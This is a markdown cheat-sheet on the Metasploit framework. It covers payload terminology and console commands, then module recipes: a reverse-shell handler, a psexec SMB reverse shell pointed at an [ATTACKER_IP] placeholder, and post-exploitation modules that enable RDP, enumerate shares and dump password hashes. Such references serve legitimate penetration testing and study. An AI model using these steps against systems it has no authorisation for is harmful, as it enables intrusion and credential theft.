---
title: METASPLOIT
summary: A penetration testing framework.
description: A penetration testing framework.
---

[https://github.com/rapid7/metasploit-framework](https://github.com/rapid7/metasploit-framework)

## METASPLOIT Terminology

### Non-Staged Payload (Singles or Inline)

**Non-staged payload are sent all at once.**

Example: windows/meterpreter_reverse_tcp.

### Staged Payload

**Staged payloads are sent in two steps:** an initial part is installed (the stager) and requests the rest of the payload. This allows for a smaller initial payload size.

Example: windows/meterpreter/reverse_tcp.

### Modules

* **Exploits:** Exploits.
* **Payloads:** Payloads (exploit + goal).
  * **Singles:** Self-contained payloads that do not need to download an additional component to run.
  * **Stagers:** Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. 
  * **Stages:** Downloaded by the stager. This will allow you to use larger sized payloads.
* **Evasion:** Try to bypass antivirus. 
* **Auxiliary:** Supporting modules such as scanners, crawlers and fuzzers.
* **Post:** Post exploitation.

### Exploit Ranking

![METASPLOITExploitRanking.png](../imgs/METASPLOITExploitRanking.png)

Source: https://docs.metasploit.com/docs/using-metasploit/intermediate/exploit-ranking.html

## METASPLOIT CONSOLE


 > 
 > **<font color=red>msfdb init</font>**</br>
 > Initialize database.
 > 
 > **<font color=red>msfconsole</font>**</br>
 > Start metasploit console.
 > 
 > **<font color=red>db_status</font>**</br>
 > Check database connection.

 > 
 > **<font color=red>search </font>\[SERVICE_TO_EXPLOIT\]**</br>
 > Search for an exploit to use against the specified service.
 > 
 > **<font color=red>use</font> \[MODULE\]**</br>
 > Select a module.
 > 
 > **<font color=red>use auxiliary</font>**</br>
 > Select an auxiliary module. 

 > 
 > **<font color=red>info</font>**</br>
 > Display information about selected module.
 > 
 > **<font color=red>show options</font>**</br>
 > Show variables (options) of selected module.

 > 
 > **<font color=red>set</font> \[VARIABLE\] \[VALUE\]**</br>
 > Set variable (option) of selected module.
 > 
 > **<font color=red>setg</font> \[VARIABLE\] \[VALUE\]**</br>
 > Set variable (option) globaly (for all modules).
 > 
 > **<font color=red>unset</font> \[VARIABLE\] \[VALUE\]**</br>
 > Unset variable.

 > 
 > **<font color=red>exploit</font>**</br>
 > Run the exploit (**<font color=red>-j</font>** to run it in background job). **run** is an alias to exploit.

 > 
 > **<font color=red>sessions -l</font>**</br>
 > List opened sessions.
 > 
 > **<font color=red>sessions</font> 1**</br>
 > Open session 1.
 > 
 > **<font color=red>background</font>**</br>
 > Background session (Ctrl + z).

 > 
 > **<font color=red>connect</font> \[HOST\]**</br>
 > Netcat like connection.
 > 
 > **<font color=red>spool</font>**</br>
 > Write console output into a file as well the screen.

## METASPLOIT MODULES

### Handler Multi


 > 
 > **<font color=red>use</font> <font color=lightblue>exploit/multi/handler</font>**</br>
 > 
 > **<font color=red>set payload</font> linux/x86/meterpreter/reverse_tcp**</br>
 > Handler for linux (efl) reverse shell.

### Reverse Shell Windows


 > 
 > **<font color=red>use</font> <font color=lightblue>exploit/windows/smb/psexec</font>**
 > 
 > **<font color=red>set lhost</font> \[ATTACKER_IP\]**</br>
 > **<font color=red>set rhosts</font> \[TARGET_IP\]**</br>
 > **<font color=red>set smbdomain</font> \[TARGET_DOMAIN\]**</br>
 > **<font color=red>set smbuser </font>\[TARGET_USER\]**</br>
 > **<font color=red>set smbpass</font> \[TARGET_IP\]**</br>
 > **<font color=red>set payload </font>windows/x64/meterpreter/reverse_tcp**</br>
 > Create a reverse shell from a SMB share.

### Post Exploit Multi


 > 
 > **<font color=red>use</font> <font color=lightblue>multi/manage/shell_to_meterpreter</font>**
 > Upgrade shell to a Meterpreter session.


 > 
 > **<font color=red>use</font> <font color=lightblue>post/multi/recon/local_exploit_suggester</font>**
 > Check exploits for privilege escalation.

### Post Exploit Windows


 > 
 > **<font color=red>use</font> <font color=lightblue>post/windows/gather/checkvm</font>**</br>
 > Check if the machine a VM.

 > 
 > **<font color=red>use</font> <font color=lightblue>post/windows/manage/enable_rdp</font>**</br>
  
 > Try to enable RDP.

 > 
 > **<font color=red>use</font> <font color=lightblue>post/windows/gather/enum_shares</font>**</br>
 > Enumerate shares.

### Post Exploit Linux


 > 
 > **<font color=red>use</font> <font color=lightblue>linux/gather/hashdump</font>**</br>
 > Dump users hashes.
